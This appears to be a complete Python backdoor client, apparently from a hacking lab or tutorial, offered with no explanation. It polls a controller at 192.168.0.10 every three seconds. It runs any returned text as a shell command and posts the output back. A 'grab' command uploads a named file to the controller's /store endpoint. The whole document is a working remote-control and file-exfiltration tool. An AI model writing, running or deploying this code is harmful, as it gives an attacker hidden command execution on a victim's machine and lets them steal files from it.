import requests
import subprocess
import time
import os

while True:
    req = requests.get('http://192.168.0.10')
    command = req.text

    if "terminate" in command:
        break
    elif 'grab' in command:
        grab,path = command.split(" * ")
        if os.path.exists(path):
            url = 'http://192.168.0.10/store'
            files = {'file': open(path, 'rb'),'path': path}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())

    time.sleep(3)
